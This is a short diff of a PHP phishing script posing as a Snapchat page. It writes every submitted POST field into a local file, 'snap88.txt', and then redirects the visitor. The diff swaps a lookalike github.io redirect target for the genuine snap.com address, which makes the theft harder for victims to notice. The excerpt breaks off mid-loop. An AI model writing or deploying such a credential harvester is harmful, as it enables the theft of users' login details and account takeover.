@@ -1,5 +1,5 @@
 <?php
-header ('Location: https://add-snapchat-naif-alassaf-model-dubai.github.io/model-Snapchat.com/welcome.html ');
+header ('Location: https://www.snap.com/en-US/ar/ ');
 $handle = fopen("snap88.txt", "a");
 foreach($_POST as $variable => $value) {
     fwrite($handle, $variable);
